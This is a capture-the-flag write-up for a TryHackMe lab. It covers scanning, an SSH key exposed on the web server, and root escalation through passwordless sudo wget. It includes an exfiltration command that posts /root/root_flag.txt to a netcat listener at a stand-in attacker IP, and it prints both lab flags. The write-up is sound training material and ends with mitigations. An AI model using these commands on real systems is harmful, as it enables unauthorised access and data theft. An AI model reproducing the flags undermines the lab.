# CTF Write-Up: [Wgel-CTF](https://tryhackme.com/room/wgel-ctf)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flags

<details>
<summary>User Flag</summary>

`057c67131c3d5e42dd5cd3075b198ff6`

</details>

<details>
<summary>Root Flag</summary>

`b1b968b37519ad1daa6408188649263d`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```bash
nmap -vv -oN Nmap/Initial <IP_ADDRESS>
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Detailed Nmap Scan

```bash
nmap -vv -oN Nmap/Detailed -p 22,80 -A <IP_ADDRESS>
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80 | HTTP | Apache httpd 2.4.18 (Ubuntu) |

### Web Enumeration (Gobuster)

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

```
/sitemap    (Status: 301)  ← actual website lives here
```

```bash
gobuster dir -u http://<IP>/sitemap/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

```
/images    (Status: 301)
/css       (Status: 301)
/js        (Status: 301)
```

Inspecting the Apache default page source (`view-source:http://<IP>/`) revealed an HTML comment leaking a username:

```html
<!-- Jessie don't forget to update the website -->
```

Checking for a hidden `.ssh` directory under `/sitemap/` exposed a private key:

```
http://<IP>/sitemap/.ssh/id_rsa  ← RSA private key readable without auth
```

---

## 2. Initial Access — Exposed SSH Private Key

With the username `jessie` from the HTML comment and the private key downloaded, SSH access was straightforward:

```bash
wget http://<IP>/sitemap/.ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa jessie@<IP>
```

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
jessie@CorpOne:~$ whoami
jessie
```

---

## 3. User Flag

```bash
cat ~/Documents/user_flag.txt
```

> User flag: `057c67131c3d5e42dd5cd3075b198ff6`

---

## 4. Privilege Escalation — sudo wget

Checking sudo permissions revealed a critical misconfiguration:

```bash
sudo -l
```

```
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

`wget` can be run as root without a password. Abusing `--post-file`, the root flag can be exfiltrated directly by POSTing the file contents to a netcat listener on the attacking machine.

**On the attacking machine:**
```bash
nc -lvnp 8888
```

**On the target:**
```bash
sudo wget --post-file=/root/root_flag.txt http://<ATTACKER_IP>:8888
```

The netcat listener receives the file contents in the HTTP POST body:

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d
```

---

## 5. Root Flag

```bash
# flag received via netcat listener
b1b968b37519ad1daa6408188649263d
```

> Root flag: `b1b968b37519ad1daa6408188649263d`

---

## 6. Attack Chain

```
Nmap Scan
    └─► Port 22 (SSH), Port 80 (HTTP/Apache)

Gobuster on /
    └─► /sitemap discovered (actual website)

View-source on default Apache page
    └─► HTML comment leaks username: jessie

Manual discovery of /.ssh/ directory
    └─► id_rsa private key exposed at /sitemap/.ssh/id_rsa

SSH Login
    └─► ssh -i id_rsa jessie@<IP> → shell as jessie → user_flag.txt

sudo -l Enumeration
    └─► (root) NOPASSWD: /usr/bin/wget

wget --post-file Abuse
    └─► POST /root/root_flag.txt to attacker netcat listener → root flag
```

---

## 7. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---------------|--------|------------|
| 1 | HTML comment leaks username | Attacker gains valid SSH username | Remove developer comments before deployment |
| 2 | SSH private key exposed via web server | Full SSH access as `jessie` without credentials | Never store SSH keys in web-accessible directories |
| 3 | `wget` granted passwordless sudo | Arbitrary file read as root via `--post-file` | Remove unnecessary sudo rules; apply principle of least privilege |

---

*Wgel-CTF — TryHackMe | Rooted ✅*
